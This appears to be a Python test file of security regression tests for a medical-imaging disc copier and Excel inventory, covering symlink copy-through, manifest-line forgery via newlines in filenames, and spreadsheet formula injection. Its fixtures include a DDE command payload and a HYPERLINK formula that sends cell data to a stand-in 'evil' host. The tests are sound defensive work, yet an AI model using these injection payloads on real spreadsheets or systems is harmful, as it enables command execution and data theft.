"""Adversarial regression tests for the folder/disc copy path and the Excel
inventory (mia_core.ripper, mia_core.inventory). See docs/SECURITY-AUDIT.md."""

from __future__ import annotations

import os
import sys

import pytest
from openpyxl import load_workbook

from mia_core import inventory
from mia_core.inventory import scan_directory, write_inventory_xlsx, xlsx_safe
from mia_core.ripper import rip_disc
from tests.helpers import make_dicom


def _symlink_or_skip(target, link):
    """Create a symlink, or skip on platforms/accounts that can't (Windows
    without the privilege). The threats these tests cover are POSIX-shaped."""
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError) as e:
        pytest.skip(f"symlinks unavailable here: {e}")


# Windows filenames can't contain control characters, so the manifest-forgery
# threat (and its test fixture) only exist on POSIX filesystems.
posix_only = pytest.mark.skipif(sys.platform == "win32",
                                reason="POSIX-only filename semantics")


# ---- A2: symlink copy-through (data exfiltration) --------------------------

def test_rip_skips_symlinked_file(tmp_path):
    secret = tmp_path / "SECRET.txt"
    secret.write_text("patient ssn 123-45-6789")
    src = tmp_path / "disc"
    src.mkdir()
    (src / "real.txt").write_text("ok")
    _symlink_or_skip(str(secret), str(src / "innocuous.dcm"))  # link -> secret

    result = rip_disc(str(src), str(tmp_path / "proj"), 1)

    copied_link = os.path.join(result.disc_dir, "innocuous.dcm")
    # The link's target content must never be materialized in the project.
    assert not os.path.exists(copied_link) or os.path.islink(copied_link)
    if os.path.exists(copied_link) and not os.path.islink(copied_link):
        with open(copied_link) as f:
            assert "ssn" not in f.read()
    # The real file still copied.
    assert os.path.exists(os.path.join(result.disc_dir, "real.txt"))


def test_rip_does_not_recurse_symlinked_dir(tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("nope")
    src = tmp_path / "disc"
    src.mkdir()
    (src / "real.txt").write_text("ok")
    _symlink_or_skip(str(outside), str(src / "linkdir"))

    result = rip_disc(str(src), str(tmp_path / "proj"), 1)
    assert not os.path.exists(os.path.join(result.disc_dir, "linkdir",
                                            "secret.txt"))
    # The skipped symlinked dir is recorded in the manifest (no silent drop).
    with open(result.manifest_path) as f:
        manifest = f.read()
    assert "Symlinks skipped" in manifest and "linkdir" in manifest


# ---- A11: control chars in a filename can't forge manifest lines -----------

@posix_only
def test_manifest_escapes_newline_in_failed_path(tmp_path, monkeypatch):
    src = tmp_path / "disc"
    src.mkdir()
    # A filename with an embedded newline that fails to copy.
    bad = src / "evil\nTotal files   : 9"
    bad.write_text("x")

    monkeypatch.setattr("mia_core.ripper.copy_with_retry",
                        lambda *a, **k: (False, "unreadable"))
    result = rip_disc(str(src), str(tmp_path / "proj"), 1)
    with open(result.manifest_path) as f:
        text = f.read()
    # The only "Total files" line must be the real header (1 file here, which
    # failed) — never the forged ": 9", regardless of trailing text.
    total_lines = [ln for ln in text.splitlines()
                   if ln.startswith("Total files")]
    assert total_lines == ["Total files   : 1"]
    # The malicious name survived as a single escaped line, not a real newline.
    assert "evil\\nTotal" in text


# ---- A1: Excel formula injection from DICOM fields -------------------------

def test_xlsx_safe_neutralizes_formula_triggers():
    assert xlsx_safe("=cmd|'/c calc'!A1").startswith("'=")
    assert xlsx_safe("+1").startswith("'+")
    assert xlsx_safe("-1").startswith("'-")
    assert xlsx_safe("@SUM(A1)").startswith("'@")
    assert xlsx_safe("BRAIN") == "BRAIN"  # benign untouched
    assert xlsx_safe(7) == 7              # non-strings untouched


def test_inventory_xlsx_has_no_live_formulas(tmp_path):
    from pydicom.uid import generate_uid
    root = tmp_path / "disc"
    make_dicom(root / "IM1", study_uid=generate_uid(),
               series_uid=generate_uid(), sop_uid=generate_uid(),
               patient_name="=cmd|'/c calc'!A1",
               study_desc='=HYPERLINK("http://evil/?x="&A1,"clickme")')
    result = scan_directory(str(root))
    out = tmp_path / "inv.xlsx"
    write_inventory_xlsx(result.studies, str(out))

    wb = load_workbook(str(out))
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                assert cell.data_type != "f", f"formula cell at {cell.coordinate}"
                if isinstance(cell.value, str):
                    assert not cell.value.startswith("="), cell.coordinate
